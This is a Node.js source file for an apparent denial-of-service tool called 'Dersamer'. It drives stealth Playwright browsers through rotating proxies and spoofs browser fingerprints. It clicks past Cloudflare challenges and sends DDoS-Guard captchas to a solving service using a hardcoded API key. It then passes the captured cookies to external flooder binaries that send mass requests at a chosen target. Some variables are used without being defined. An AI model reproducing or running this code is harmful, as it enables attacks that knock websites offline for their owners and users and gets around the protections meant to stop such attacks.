const { chromium } = require('playwright-extra');
const { spawn } = require('child_process');
const fs = require('fs');
const url = require('url');

const axios = require('axios');

const EventEmitter = require('events');
const emitter = new EventEmitter();

process.setMaxListeners(0);
process.on('uncaughtException', function(error)  {  });
process.on('unhandledRejection', function(error) {  });

const [target, time, threads, requests, connection, proxyfile, emulation, precheck, captcha, autoratelimit, usersag, customcookie, highreq, flooder] = process.argv.slice(2);

if (process.argv.length < 5) {
    console.log('node dersamer.js target time threads requests connection proxyfile emulation precheck captcha autoratelimit user-agent custom_cookie highreq flooder');
    process.exit(-1);
}

const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

function userAgents() {
	if(usersag == 'bots') { return 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' }
	else if (usersag == 'browsers') { return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' }
	else if (usersag == undefined) { return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' }
	else { return usersag }
}

var starts;
let ratelimiting = 0;

async function run_autoratelimit(target, time) {
	const browser = await chromium.launch({
		headless: false,
		javaScriptEnabled: true,
		permissions: ['camera', 'microphone'],	
		proxy: { server: 'http://' + proxy },
		args: [
			'--disable-blink-features=AutomationControlled', 
			'--disable-features=IsolateOrigins,site-per-process', 
			'--user-agent=' + userAgents(),
			'--use-fake-device-for-media-stream',
			'--use-fake-ui-for-media-stream',
			'--no-sandbox',	
            '--enable-experimental-web-platform-features',
            '--disable-dev-shm-usage',
            '--disable-software-rastrizier',
            '--enable-features=NetworkService'			
		],
		ignoreDefaultArgs: ['--enable-automation'],
	});

	const context = await browser.newContext({ viewport: { width: 1920, height: 1080 }, deviceScaleFactor: 1 });
	const page = await context.newPage();
	await page.setViewportSize({ width: 1920, height: 1080 });
	await page.emulateMedia({ colorScheme: 'dark' })	
	
	const brands = [{"brand":" Not A;Brand","version":"9"},{"brand":"Chromium","version":result.browser['major']},{"brand":"Google Chrome","version":result.browser['major']}]
	await page.addInitScript(() => {
		['height', 'width'].forEach(property => {
			const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
			Object.defineProperty(HTMLImageElement.prototype, property, {
				...imageDescriptor,
				get: function() {
					if (this.complete && this.naturalHeight == 0) {
						return 20;
					}
					return imageDescriptor.get.apply(this);
				},
			});
		});	

		Object.defineProperty(Notification, 'permission', {
			get: function() {
				return 'default';
			}
		});	

		Object.defineProperty(navigator, 'pdfViewerEnabled', {
			get: () => true,
		});

		Object.defineProperty(navigator.connection, 'rtt', {
			get: () => 150,
		});

		Object.defineProperty(navigator, 'share', {
			get: () => false,
		});

		Object.defineProperty(navigator, 'bluetooth', {
			get: () => true,
		});

	})
	
	await page.addInitScript(() => {
	  Object.defineProperty(navigator, 'keyboard', {
		get: function() {
		  return true;
		}
	  });
	  Object.defineProperty(navigator, 'mediaCapabilities', {
		get: function() {
		  return true;
		}
	  });
	  Object.defineProperty(navigator, 'mediaDevices', {
		get: function() {
		  return true;
		}
	  });
	  Object.defineProperty(navigator, 'mediaSession', {
		get: function() {
		  return true;
		}
	  });
	  Object.defineProperty(navigator, 'oscpu', {
		get: function() {
		  return 'Windows (Win32)';
		}
	  });
	  Object.defineProperty(navigator, 'platform', {
		get: function() {
		  return 'Win32';
		}
	  });
	  Object.defineProperty(navigator, 'product', {
		get: function() {
		  return 'Gecko';
		}
	  });
	  Object.defineProperty(navigator, 'productSub', {
		get: function() {
		  return '20100101';
		}
	  });
	  Object.defineProperty(navigator, 'vendor', {
		get: function() {
		  return 'Google Inc.';
		}
	  });
	});		
	
	await page.goto(target);
	await mouser(page);
	for(let i = 0; i < requests; i++) {
		const response = await page.goto(target);
		const status = await response.status();
		if(![429].includes(status)) {
			await page.reload();
		} else if(status == 429) {
			ratelimiting++
		}
	}
	
	await page.close();
	await context.close();
	await browser.close();	
	
	console.log('[Dersamer] Detect: ' + ratelimiting + '/' + requests);
	console.log('[Dersamer] Browser started [' + threads + ']');
	for (let i = 0; i < threads; i++) {
		const proxied = proxies[Math.floor(Math.random() * proxies.length)];
		run(target, time, proxied);
	}
}

async function run(target, time, proxy) {
	const browser = await chromium.launch({
		headless: false,
		javaScriptEnabled: true,
		permissions: ['camera', 'microphone'],	
		proxy: { server: 'http://' + proxy },
		args: [
			'--disable-blink-features=AutomationControlled', 
			'--disable-features=IsolateOrigins,site-per-process', 
			'--user-agent=' + userAgents(),
			'--use-fake-device-for-media-stream',
			'--use-fake-ui-for-media-stream',
			'--no-sandbox',	
            '--enable-experimental-web-platform-features',
            '--disable-dev-shm-usage',
            '--disable-software-rastrizier',
            '--enable-features=NetworkService'			
		],
		ignoreDefaultArgs: ['--enable-automation'],
	});

	const context = await browser.newContext({ viewport: { width: 1920, height: 1080 }, deviceScaleFactor: 1 });
	
	const { UAParser } = require('ua-parser-js');
	const parser = new UAParser();
	parser.setUA(userAgents());
	const result = parser.getResult();
	
	await context.setExtraHTTPHeaders({
		'sec-ch-ua': `"Not A;Brand";v="9", "Chromium";v="` + result.browser['major'] + `", "Google Chrome";v="` + result.browser['major'] + `"`
	})		
	
	const page = await context.newPage();
	await page.setViewportSize({ width: 1920, height: 1080 });
	await page.emulateMedia({ colorScheme: 'dark' })	
	
	try {
		const brands = [{"brand":" Not A;Brand","version":"9"},{"brand":"Chromium","version":result.browser['major']},{"brand":"Google Chrome","version":result.browser['major']}]
		await page.addInitScript(() => {
			['height', 'width'].forEach(property => {
				const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
				Object.defineProperty(HTMLImageElement.prototype, property, {
					...imageDescriptor,
					get: function() {
						if (this.complete && this.naturalHeight == 0) {
							return 20;
						}
						return imageDescriptor.get.apply(this);
					},
				});
			});	

			Object.defineProperty(Notification, 'permission', {
				get: function() {
					return 'default';
				}
			});	

			Object.defineProperty(navigator, 'pdfViewerEnabled', {
				get: () => true,
			});

			Object.defineProperty(navigator.connection, 'rtt', {
				get: () => 150,
			});

			Object.defineProperty(navigator, 'share', {
				get: () => false,
			});

			Object.defineProperty(navigator, 'bluetooth', {
				get: () => true,
			});

		})
		
		await page.addInitScript(() => {
		  Object.defineProperty(navigator, 'keyboard', {
			get: function() {
			  return true;
			}
		  });
		  Object.defineProperty(navigator, 'mediaCapabilities', {
			get: function() {
			  return true;
			}
		  });
		  Object.defineProperty(navigator, 'mediaDevices', {
			get: function() {
			  return true;
			}
		  });
		  Object.defineProperty(navigator, 'mediaSession', {
			get: function() {
			  return true;
			}
		  });
		  Object.defineProperty(navigator, 'oscpu', {
			get: function() {
			  return 'Windows (Win32)';
			}
		  });
		  Object.defineProperty(navigator, 'platform', {
			get: function() {
			  return 'Win32';
			}
		  });
		  Object.defineProperty(navigator, 'product', {
			get: function() {
			  return 'Gecko';
			}
		  });
		  Object.defineProperty(navigator, 'productSub', {
			get: function() {
			  return '20100101';
			}
		  });
		  Object.defineProperty(navigator, 'vendor', {
			get: function() {
			  return 'Google Inc.';
			}
		  });
		});	
	} catch (err) {}
	
	try {
		const response = await page.goto(target);
		const headers = await response.request().allHeaders();
		const status = await response.status();
		await mouser(page);
		if(emulation == 'true') { 
			if(![200, 404].includes(status)) {
				console.log('[Dersamer] Detect protection.');
				await page.waitForTimeout(10000);
				
				const Cloudflare = await page.evaluate(() => {
					const button = document.querySelector('.big-button.pow-button');
					if(button) {
						const { x, y, width, height } = button.getBoundingClientRect();
						return { x: x + width / 2, y: y + height / 2 };
					} else { return false }
				});
				if(Cloudflare != false) {
					console.log('[Dersamer] Detect Legacy Captcha');
					await page.hover('.big-button.pow-button');
					await page.mouse.click(Cloudflare.x, Cloudflare.y);
					await page.waitForTimeout(6000);
					console.log('[Dersamer] Legacy Captcha bypassed.');
				}
				
				if(captcha == 'true') { await ddgCaptcha(page) }
				if(precheck == 'true') { 
					const checked_title = await page.title();
					if(['Just a moment...', 'Checking your browser...', 'Access denied', 'DDOS-GUARD'].includes(checked_title)) {
						await page.close();
						await context.close();
						await browser.close();
					}		
				}
				
				const cookie = (await page.context().cookies(target)).map(c => `${c.name}=${c.value}`).join('; ');
				flood(cookie, headers, proxy);
				console.log('[Dersamer] Cookie: ' + cookie);
				await page.close();
				await context.close();
				await browser.close();
				const fanera = proxies[Math.floor(Math.random() * proxies.length)];
				run(target, time, fanera);
				
			} else {
				console.log('[Dersamer] No Detect protection.');
				await page.waitForTimeout(2000);
				const cookie = (await page.context().cookies(target)).map(c => `${c.name}=${c.value}`).join('; ');
				flood(cookie, headers, proxy);
				console.log('[Dersamer] Cookie: ' + cookie);
				await page.close();
				await context.close();
				await browser.close();
				const fanera = proxies[Math.floor(Math.random() * proxies.length)];
				run(target, time, fanera);
			}
		} else { 
			await page.waitForTimeout(2000);
			const cookie = (await page.context().cookies(target)).map(c => `${c.name}=${c.value}`).join('; ');
			flood(cookie, headers, proxy);
			console.log('[Dersamer] Cookie: ' + cookie);
			await page.close();
			await context.close();
			await browser.close();
			const fanera = proxies[Math.floor(Math.random() * proxies.length)];
			run(target, time, fanera);		
		}
	} catch(err) {
		page.close();
		context.close();
		browser.close();
		const fanera = proxies[Math.floor(Math.random() * proxies.length)];
		run(target, time, fanera);		
	}
}

async function mouser(page) {
	const pageViewport = await page.viewportSize();

	for (let i = 0; i < 3; i++) {
		const x = Math.floor(Math.random() * pageViewport.width);
		const y = Math.floor(Math.random() * pageViewport.height);
		await page.mouse.click(x, y);
	}

	const centerX = pageViewport.width / 2;
	const centerY = pageViewport.height / 2;
	await page.mouse.move(centerX, centerY);
	await page.mouse.down();
	await page.mouse.move(centerX + 100, centerY);
	await page.mouse.move(centerX + 100, centerY + 100);
	await page.mouse.move(centerX, centerY + 100);
	await page.mouse.move(centerX, centerY);
	await page.mouse.up();
	await page.waitForTimeout(2000);
}	

async function ddgCaptcha(page) {

    let s = false

    for (let j = 0; j < page.frames().length; j++) {
        const frame = page.frames()[j]
        const captchaStatt = await frame.evaluate(() => {

            if (document.querySelector("#ddg-challenge") && document.querySelector("#ddg-challenge").getBoundingClientRect().height > 0) {
                return true
            }

            const captchaStatus = document.querySelector(".ddg-captcha__status")
            if (captchaStatus) {


                captchaStatus.click()
                return true
            } else {
                return false
            }
        })

        if (captchaStatt) {
            await page.waitForTimeout(3000)

            const base64r = await frame.evaluate(async () => {
                const captchaImage = document.querySelector(".ddg-modal__captcha-image")
                const getBase64StringFromDataURL = (dataURL) =>
                    dataURL.replace('data:', '').replace(/^.+,/, '');

                const width = captchaImage?.clientWidth
                const height = captchaImage?.clientHeight

                const canvas = document.createElement('canvas')
                canvas.width = width
                canvas.height = height

                canvas.getContext('2d').drawImage(captchaImage, 0, 0);
                const dataURL = canvas.toDataURL('image/jpeg', 0.5);
                const base64 = getBase64StringFromDataURL(dataURL);

                return base64
            })

            if (base64r) {
				try {
					console.log('[Dersamer] DDoS-Guard Captcha Detected.');	
					const response = await axios.post("https://api.nopecha.com/", {
						key: '3emcidab5z_5QRDMBAN',
						type: 'textcaptcha',
						image_urls: [base64r]
						}, {
						headers: {
							'Content-Type': 'application/json'
						}
					});

					const res = response.data;

					const text = await new Promise((resCaptcha) => {
						function get() {
							axios.get('https://api.nopecha.com/', {
								params: {
									id: res.data,
									key: '3emcidab5z_5QRDMBAN'
								}
							}).then(res => {
								if (res.data.error) {
									setTimeout(get, 1000);
								} else {
									resCaptcha(res.data.data[0]);
								}
							}).catch(error => {})
						}
						get()
					})

					s = text
					console.log(s);
					
					await frame.evaluate((text) => {
						const captchaInput = document.querySelector(".ddg-modal__input")
						const captchaSubmit = document.querySelector(".ddg-modal__submit")

						captchaInput.value = text
						captchaSubmit.click()
					}, text)
					await page.waitForTimeout(6500);
					console.log('[Dersamer] DDoS-Guard Captcha bypassed.');	
				} catch(err) {}
            }
        }
    }
    return !!!s
}

function flood(cookie, headers, proxy) {
	try {
		const parsed = url.parse(target);
		delete headers[':path'];
		delete headers[':method'];
		delete headers[':scheme'];
		delete headers[':authority'];
		if(!['false', undefined].includes(customcookie)) { cookie += customcookie }
		if(!['false', undefined].includes(highreq)) { connection += 2 }
		if(!['0'].includes(ratelimiting)) { requests - ratelimiting }	
		
		const headerEntries = Object.entries(headers);	
		const args_onetwo = [
			'-k', 'nxver',
			'-t', '1',
		].concat(proxy.indexOf("@") != -1 ? [
			'-x',
			proxy.split('@', 1)[0]
		] : []).concat([
			'-p',
			proxy.indexOf('@') != -1 ? proxy.split('@')[1] : proxy,
			'-u', 'https://' + parsed.host + parsed.path,
			'-n', requests,
			'-r', connection,
			'-s', '1',
		]).concat(...headerEntries.map(entry => ['-h', `${entry[0]}@${entry[1]}`])).concat([
			'-h',
			`cookie@${cookie.length > 0 ? cookie : 'test@1'}`,
			'-h',
			'referer@' + 'https://' + parsed.host + parsed.path,
		])
		
		const args_test = [
			'-p', proxy,
			'-u', target,
			'-r', connection,
			'-t', requests,
			'-d', time
		].concat(...headerEntries.map(entry => ['-h', `${entry[0]}@${entry[1]}`])).concat([
			'-h',
			`cookie@${cookie.length > 0 ? cookie : 'test@1'}`,
			'-h',
			'referer@' + target,
		])		
			
		if(["one", "two", undefined].includes(flooder)) {
			starts = spawn('./flooder', args_onetwo);		
			starts.on('data', (data) => {});			
			starts.on('exit', (err, signal) => { starts.kill() });
		} else {
			starts = spawn('./dersamerv2', args_test, {
                stdio: 'inherit',
                detached: false,
			});		
			starts.on('data', (data) => {});			
			starts.on('exit', (err, signal) => { starts.kill() });			
		}
			
	} catch(err) {}
}

for (let i = 0; i < threads; i++) {
	console.clear();
	const proxy = proxies[Math.floor(Math.random() * proxies.length)];
	if(!['true'].includes(autoratelimit)) {
		console.log('[Dersamer] Default browser started [' + i + '/' + threads + ']');		
		run(target, time, proxy);
	}
}

if(!['false', undefined].includes(autoratelimit)) {
	console.clear();
	console.log('[Dersamer] Ratelimit detect started.');
	run_autoratelimit(target, time);
}

setTimeout(function() {
	console.clear();
	process.exit(-1);
	starts.kill(-1);
	spawn.kill(-1);
}, time * 1000);